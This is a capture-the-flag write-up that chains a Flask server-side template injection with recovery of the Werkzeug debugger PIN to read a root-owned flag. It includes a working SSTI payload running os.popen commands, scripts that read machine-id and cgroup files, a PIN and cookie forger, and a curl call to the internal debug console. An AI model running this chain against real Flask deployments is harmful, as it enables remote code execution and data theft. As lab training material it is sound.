## I can Read!  

<img src="images/chall.png" width=600>

### Vulnerability Analysis  

This challenge consists of a main server and an internal admin server running on port `5000` and `8000` respectively.  

In `/main/app.py`, we can immediately notice an SSTI vulnerability in the `/path` endpoint. Keep this in mind for later.  

```python
from flask import Flask,render_template, render_template_string

app = Flask(__name__)
blacklist =[]

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/<path:s>')
def E404(s):
    page = f'''
    <h1>404 : {s} Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    '''
    return render_template_string(page)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

The admin server is just as minimal as the main page, and at first glance, there doesn't appear to be anything helpful, or any reference to the flag.  

However, we can notice that `app.run()` is being called with `debug=True`. Furthermore, the `/keygen` path allows us to trigger a `ZeroDivisionError` by passing in a string of length `1`. 

This clearly hints at a Werkzeug debugger RCE exploit, where if we are able to get the PIN to unlock the Werkzeug debug console, we can get RCE on the server.    

```python
#!/usr/bin/python3
from flask import Flask
import hashlib

app = Flask(__name__)


@app.route('/')
def index():
    return "ADMIN PAGE!"

@app.route('/keygen/<path:string>')
def keygen(string):
    n = len(string)-1
    a = hashlib.md5(string.encode('utf-8'))
    return str(hex(int(int(a.hexdigest(),16)/n)))

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0', port=8000)
```

However, looking at the `Dockerfile`, we can notice a few issues.  

First, only the main server is exposed, so we have no way of directly interacting with the admin endpoint. In the simplest versions of Werkzeug debugger exploits, the attacker is able to trigger an error and directly interact with the debugger UI, but we unfortunately don't have that liberty here.  

Next, the flag file is root-owned, meaning that we can't use SSTI in the main server to read it.  

```dockerfile
# FROM ubuntu:20.04
FROM python:3.8

# RUN apt update && apt install -y python3.8
# RUN apt install python3-pip -y
RUN apt install curl -y
RUN pip3 install flask

WORKDIR /var/www/
COPY main ./main/
COPY admin ./admin/
RUN chmod 755 /var/www/
COPY flag /
RUN chmod 700 /flag
ADD run.sh /run.sh
RUN useradd user
CMD ["/run.sh"]

EXPOSE 5000
```

### PIN Generation Analysis  

[This article](https://b33pl0g1c.medium.com/hacking-the-debugging-pin-of-a-flask-application-7364794c4948) has a detailed explanation of the exploitation steps to unlocking the debug console.  

For the exploit to work, we need LFI or any vuln that lets us read system files, which is where the SSTI vuln comes in. We can write a convenience function to gain RCE on the server.  

```python
def clean(text):
    text = html.unescape(text)
    leak = re.findall(r'404 :(.+)Not Found', text, re.DOTALL)[0]
    
    return leak.strip()

def rce(cmd=''):
    payload = "{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('%s').read() }}" % cmd

    res = requests.get(f'{url}/{payload}')

    return clean(res.text)
```

Before that, it would be a good idea to look at the actual PIN generation code, as the algorithm varies across different Werkzeug versions.  

We can first trigger an error in the admin server through the main server.  

```python
rce('curl http://127.0.0.1:8000/')
```

The error messages reveal the absolute path of the `flask` package, so we can deduce that the Werkzeug PIN generation code is in `/usr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py`.  

<img src="images/path.png" width=600>

We can read the code using `rce('cat /usr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py')`, which will give us this.  

```python
def get_pin_and_cookie_name(
    app: "WSGIApplication",
) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:
    ...

    modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
    username: t.Optional[str]

    try:
        # getuser imports the pwd module, which does not exist in Google
        # App Engine. It may also raise a KeyError if the UID does not
        # have a username, such as in Docker.
        username = getpass.getuser()
    except (ImportError, KeyError):
        username = None

    mod = sys.modules.get(modname)

    # This information only exists to make the cookie unique on the
    # computer, not as a security feature.
    probably_public_bits = [
        username,
        modname,
        getattr(app, "__name__", type(app).__name__),
        getattr(mod, "__file__", None),
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.
    private_bits = [str(uuid.getnode()), get_machine_id()]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv, cookie_name
```

From the above, we can see that the PIN is constructed using public bits and private bits. 

### Public Bits  

The first public bit is `username`,  which is the user that ran the flask app. Although `run.sh` isn't provided, based on the flag having root-only perms, we can assume that the admin server is running as `root`.  

The next two public bits are `modname` and `getattr(app, "__name__", type(app).__name__)`, which are always `flask.app` and `Flask`, so we don't have to worry about those.  

The last public bit is `getattr(mod, "__file__", None)`, which is the absolute path of the `flask` package, which we already leaked from the error message earlier.  

### Private Bits  

The private bits aren't as straightforward, since they will vary across different challenge instances.   

The first private bit is `str(uuid.getnode())`. We can retrieve this by running it as a Python command using the SSTI vuln from earlier. In my case, it was `187999308497409`.    

```python
rce("python3 -c \\'import uuid;print(uuid.getnode())\\'")
```

The second private bit is slightly more complicated. The code will get the machine ID from either `/etc/machine-id` or `/proc/sys/kernel/random/boot_id`, then it will fetch the container ID from `/proc/self/cgroup` and append it to the back of the machine ID.  

```python
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

try:
    with open("/proc/self/cgroup", "rb") as f:
        linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
    pass

if linux:
    return linux
```

We can just replicate this in Python.  

```python
machine_id = ""
for file in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
    value = rce(f'cat {file}')

    if value:
        machine_id += value
        break
```

### Recovering the PIN  

To recover the PIN, we can replicate the generation code on the server, giving us `383-139-343`.  

```python
def crack(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    num = None
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    rv=None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num
    return rv
```

### Unlocking the Console  

Since we can't manually enter the PIN into the debugger, we need to find another way to authenticate ourselves and send commands over.  

Based on [this writeup](https://deltaclock.gitbook.io/ctf-writeups/securinets-ctf-quals-2021-mixed), we can send commands through the  `/console` endpoint.  

To do that, we need two more pieces of information: the console secret and the cookie.  

The secret can be retrieved from the error messages from earlier.  

<img src="images/secret.png" width=600>

As for the cookie, looking at the Werkzeug source code, we can see that its structure is the current time and the pin hash.  

```python
if auth:
    rv.set_cookie(
        self.pin_cookie_name,
        f"{int(time.time())}|{hash_pin(pin)}",
        httponly=True,
        samesite="Strict",
        secure=request.is_secure,
    )
```

We can replicate the cookie generation logic in Python.  

```python
import time

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

cookie = f'{int(time.time())}|{hash_pin(pin)}'
```

Now that we have all the info we need, we can finally make a `curl` request to the `/console` endpoint and read the flag.  

Since the debugger console is just like a regular Python console, it will output the last evaluated result, so we don't have to `print()` the flag contents.  

```python
cmd = 'open("/flag").read()'

rce(f'curl -G http://127.0.0.1:8000/console -d __debugger__=yes -d cmd={quote(cmd)} -d frm=0 -d s={secret} -H "Cookie: {cookie}"')
```

Flag: `BISC{HOw_dId_y0u_rEad_TH3_F14g_wItH_y0ur_pErM1SSiON?}`